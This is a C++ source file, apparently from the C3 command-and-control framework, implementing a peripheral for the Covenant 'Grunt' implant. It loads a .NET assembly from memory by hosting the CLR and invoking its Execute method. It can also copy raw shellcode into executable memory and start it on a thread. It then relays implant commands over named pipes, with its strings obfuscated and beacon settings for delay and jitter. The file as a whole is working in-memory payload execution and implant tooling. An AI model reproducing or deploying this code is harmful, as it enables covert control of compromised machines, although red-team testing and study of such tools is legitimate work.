#include "StdAfx.h"

#if defined (__clang__)
#warning("Compilation of Grunt peripheral is only supported with MSVC")
#elif defined (_MSC_VER)

#include "Grunt.h"

//For loading of CLR
#pragma comment(lib, "mscoree.lib")
#import "mscorlib.tlb" raw_interfaces_only high_property_prefixes("_get", "_put", "_putref") rename("ReportEvent", "InteropServices_ReportEvent") auto_rename

using namespace mscorlib;

//This function will run the .NET assembly
static void RuntimeV4Host(PBYTE pbAssembly, SIZE_T assemblyLen)
{
	HANDLE hHeap = GetProcessHeap();
	HRESULT hr;
	ICLRMetaHost* pMetaHost = NULL;
	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	ICorRuntimeHost* pCorRuntimeHost = NULL;
	IUnknownPtr spAppDomainThunk = NULL;
	_AppDomainPtr spDefaultAppDomain = NULL;
	_AssemblyPtr spAssembly = NULL;
	_TypePtr spType = NULL;
	_variant_t vtEmpty = NULL;
	_variant_t output;
	BSTR bstrStaticMethodName = NULL;
	BSTR bstrClassName = NULL;
	SAFEARRAY* psaTypesArray = NULL;
	SAFEARRAY* psaStaticMethodArgs = NULL;
	SAFEARRAY* arr = NULL;
	PBYTE pbAssemblyIndex = NULL;
	PBYTE pbDataIndex = NULL;
	long index = 0;
	PWSTR wcs = NULL;

	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost));
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	hr = pMetaHost->GetRuntime(OBF(L"v4.0.30319"), IID_PPV_ARGS(&pRuntimeInfo));
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	BOOL fLoadable;
	hr = pRuntimeInfo->IsLoadable(&fLoadable);
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	if (!fLoadable)
	{
		goto Cleanup;
	}

	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_PPV_ARGS(&pCorRuntimeHost));
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	hr = pCorRuntimeHost->Start();
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	hr = pCorRuntimeHost->CreateDomain(OBF(L"AppDomain"), NULL, &spAppDomainThunk);
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	hr = spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&spDefaultAppDomain));
	if (FAILED(hr))
	{
		goto Cleanup;
	}


	SAFEARRAYBOUND bounds[1];
	bounds[0].cElements = static_cast<ULONG>(assemblyLen);
	bounds[0].lLbound = 0;

	arr = SafeArrayCreate(VT_UI1, 1, bounds);
	SafeArrayLock(arr);

	pbAssemblyIndex = pbAssembly;
	pbDataIndex = (PBYTE)arr->pvData;

	while (static_cast<SIZE_T>(pbAssemblyIndex - pbAssembly) < assemblyLen)
		*(BYTE*)pbDataIndex++ = *(BYTE*)pbAssemblyIndex++;

	SafeArrayUnlock(arr);
	hr = spDefaultAppDomain->Load_3(arr, &spAssembly);


	if (FAILED(hr) || spAssembly == NULL)
	{
		goto Cleanup;
	}


	hr = spAssembly->GetTypes(&psaTypesArray);
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	index = 0;
	hr = SafeArrayGetElement(psaTypesArray, &index, &spType);
	if (FAILED(hr) || spType == NULL)
	{
		goto Cleanup;
	}
	bstrStaticMethodName = SysAllocString(L"Execute");

	hr = spType->InvokeMember_3(bstrStaticMethodName, static_cast<BindingFlags>(
		BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
		NULL, vtEmpty, NULL, &output);

	if (FAILED(hr))
	{
		goto Cleanup;
	}

Cleanup:
	if (spDefaultAppDomain)
	{
		pCorRuntimeHost->UnloadDomain(spDefaultAppDomain);
		spDefaultAppDomain = NULL;
	}
	if (pMetaHost)
	{
		pMetaHost->Release();
		pMetaHost = NULL;
	}
	if (pRuntimeInfo)
	{
		pRuntimeInfo->Release();
		pRuntimeInfo = NULL;
	}
	if (pCorRuntimeHost)
	{
		pCorRuntimeHost->Release();
		pCorRuntimeHost = NULL;
	}
	if (psaTypesArray)
	{
		SafeArrayDestroy(psaTypesArray);
		psaTypesArray = NULL;
	}
	if (psaStaticMethodArgs)
	{
		SafeArrayDestroy(psaStaticMethodArgs);
		psaStaticMethodArgs = NULL;
	}
	SysFreeString(bstrClassName);
	SysFreeString(bstrStaticMethodName);
}


FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
{

	auto [automaticExecution, gruntType, pipeName, payload, connectAttempts] = arguments.Read<std::string, std::string, std::string, ByteVector, uint32_t>();

	BYTE* x = (BYTE*)payload.data();
	SIZE_T len = payload.size();

	//Setup the arguments to run the .NET assembly in a seperate thread.
	namespace SEH = FSecure::WinTools::StructuredExceptionHandling;
	SEH::gruntArgs args;
	args.gruntStager = x;
	args.len = len;
	args.func = RuntimeV4Host;


	// Inject the payload stage into the current process.
	if (automaticExecution != "false") {
		if (gruntType == "binary") {
			Log({ OBF_SEC("Binary, Automatic grunt execution"), LogMessage::Severity::DebugInformation });
			if (!_beginthreadex(NULL, 0, reinterpret_cast<_beginthreadex_proc_type>(SEH::SehWrapperCov), &args, 0, nullptr))
				throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
		}
		else if (gruntType == "shellcode") {
			Log({ OBF_SEC("Shellcode, Automatic grunt execution"), LogMessage::Severity::DebugInformation });
			PVOID pa = VirtualAlloc(nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (nullptr == pa) {
				throw std::runtime_error{ OBF("Couldn't allocate mem: ") + std::to_string(GetLastError()) + OBF(".") };
			}
			memcpy(pa, payload.data(), payload.size());
			DWORD(WINAPI * sehWrapper)(SEH::CodePointer) = SEH::SehWrapper;
			if (!_beginthreadex(NULL, 0, reinterpret_cast<_beginthreadex_proc_type>(sehWrapper), pa, 0, nullptr))
				throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
		}
	}
	else {
		Log({ OBF_SEC("Manual grunt execution"), LogMessage::Severity::DebugInformation });
	}

	std::this_thread::sleep_for(std::chrono::milliseconds{ 30 }); // Give Grunt thread time to start pipe.
	for (auto i = 0u; i < connectAttempts; i++)
	{
		try
		{
			m_Pipe = WinTools::AlternatingPipe{ ByteView{ pipeName + "w" } };
			m_Pipew = WinTools::AlternatingPipe{ ByteView{ pipeName } };
			return;
		}
		catch (std::exception& e)
		{
			// Sleep between trials.
			Log({ OBF_SEC("Grunt constructor: ") + e.what(), LogMessage::Severity::DebugInformation });
			std::this_thread::sleep_for(std::chrono::milliseconds{ 100 });
		}
	}

	throw std::runtime_error{ OBF("Grunt creation failed") };
}

void FSecure::C3::Interfaces::Peripherals::Grunt::OnCommandFromConnector(ByteView data)
{
	// Write to Covenant specific pipe
	m_Pipew->WriteCov(data);
}

FSecure::ByteVector FSecure::C3::Interfaces::Peripherals::Grunt::OnReceiveFromPeripheral()
{
	// Read
	auto ret = m_Pipe->ReadCov();

	return  ret;

}

void FSecure::C3::Interfaces::Peripherals::Grunt::Close()
{
	FSecure::C3::Device::Close();
	std::scoped_lock lock(m_Mutex);
	m_Close = true;
	m_ConditionalVariable.notify_one();
}


FSecure::ByteView FSecure::C3::Interfaces::Peripherals::Grunt::GetCapability()
{
	return R"(
{
	"create":
	{
		"arguments":
		[
			{
				"type": "select",
				"name": "Automatic Execution",
				"selected": "false",
				"defaultValue" : "false",
				"options" : {"true": "true", "false": "false"},
				"feedback" : "validated",
				"description": "Execute grunt manually or automatically."
			},
			{
				"type": "select",
				"name": "Grunt Type",
				"selected" : "shellcode",
				"defaultValue" : "shellcode",
				"options" : {"binary": "binary", "shellcode": "shellcode"},
				"feedback" : "validated",
				"description": "Covenant grunt template type. (shellcode/binary) "
			},
{
				"type": "select",
				"name": ".Net Framework",
				"selected": "Net472",
				"defaultValue" : "Net472",
				"options" : {"Net40": "Net40", "Net472": "Net472", "Net35": "Net35"},
				"feedback" : "validated",
				"description": "Execute grunt manually or automatically."
			},
			{
				"type": "string",
				"name": "Pipe name",
				"min": 4,
				"randomize": true,
				"description": "Name of the pipe Beacon uses for communication."
			},
			{
				"type": "int32",
				"min": 1,
				"defaultValue" : 30,
				"name": "Delay",
				"description": "Delay"
			},
			{
				"type": "int32",
				"min": 0,
				"defaultValue" : 30,
				"name": "Jitter",
				"description": "Jitter"
			},
			{
				"type": "int32",
				"min": 10,
				"defaultValue" : 30,
				"name": "Connect Attempts",
				"description": "Number of attempts to connect to SMB Pipe"
			}
		]
	},
	"commands": []
}
)";
}

#endif
